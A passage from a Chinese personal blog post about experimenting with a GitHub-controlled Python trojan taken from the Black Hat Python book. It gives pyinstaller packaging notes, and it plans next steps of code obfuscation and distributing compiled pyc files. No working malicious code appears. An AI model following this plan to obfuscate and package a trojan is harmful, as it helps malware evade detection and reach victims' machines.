+<p>我们发现一个有趣的现象，那些叫做软件的代码，通常拥有充足的资源和权限，用户尽力满足配合软件的种种需求，饶是如此，它们还常常莫名其妙地奔溃，而另一类被称作病毒的代码，时刻被限制和提防，饶是如此，它们依然能在各种复杂的环境下健壮地运行。</p>
+<p>在某种意义上，计算机科学由黑客（hacker）驱动着</p>
+<p>我们实际上可以将以上代码看做一种热更新机制，我们可以用它来升级已分发的程序，不需要重启就能升级软件，看上去如同生物一般生长</p>
+<h1 id="github-webhooks--services">github Webhooks &amp; services</h1>
+<blockquote>
+<p>Webhooks allow external services to be notified when certain events happen within your repository. When the specified events happen, we’ll send a POST request to each of the URLs you provide</p>
+</blockquote>
+<p>利用github提供的webhook功能，我们可以进行时间通知</p>
+<h3 id="热加载">热加载</h3>
+<p>热加载是我前段时间感兴趣的一个话题，最初源于和@xudong的讨论，有空再写这部分</p>
+<h1 id="建议">建议</h1>
+<ul>
+<li>用小号测试</li>
+<li>不要做坏事哦</li>
+</ul>
+<h1 id="接下来干啥">接下来干啥</h1>
+<ul>
+<li>代码混淆</li>
+<li>分发pyc</li>
+</ul>
+<h1 id="坑">坑</h1>
+<p>###pyinstaller</p>
+<ul>
+<li>pyinstaller &ndash;onefile git_trojan.py 能能通过</li>
+<li>pyinstaller 编译python2脚本时Queue会找不到， 使用2to3转为python3编译，会进进下一个问题</li>
+<li>github3.py引用的requests会报错，编码问题（python2和3都存在）</li>
+</ul>
+<h3 id="编码问题">编码问题</h3>
+<p>2to3 -w git_trojan.py,之后用python3执行，报错：<code>LookupError: unknown encoding: idna</code></p>
+<h1 id="资源">资源</h1>
+<ul>
+<li><a href="https://github.com/wwj718/blackhatpythonbook">blackhatpythonbook</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">种瓜</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2016-07-13
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/dev-tools/">dev-tools</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/edx/edx-user-import/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">为edX批量导入用户</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/%E8%AF%BB%E4%B9%A6/the-foundation-series/">
+            <span class="next-text nav-default">基地</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:wuwenjie718@gmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="mailto:wuwenjie718@gmail.com" class="iconfont icon-out-me" title="out-me"></a>
+      <a href="https://github.com/wwj718" class="iconfont icon-github" title="github"></a>
+  <a href="http://wwj718.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span><a target="_blank" href="/post/%E7%BC%96%E7%A8%8B/dynaverse-studio/">加入我们</a></span>
+  <span class="division">|</span>
+  <span><a target="_blank" href="https://cn.bing.com/search?q=site%3Awwj718.github.io%20%20codelab-adapter">搜索本站</a></span>
+  <span class="division">|</span>
+  <span><a target="_blank" href="/index.xml">RSS订阅</a></span>
+  <span class="division">|</span>
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2013 - 
+    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>种瓜</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js"></script>
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?18db4b662c04fbd6cc2851d246c51b3f";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+
+
+
+
+
+</body>
+</html>
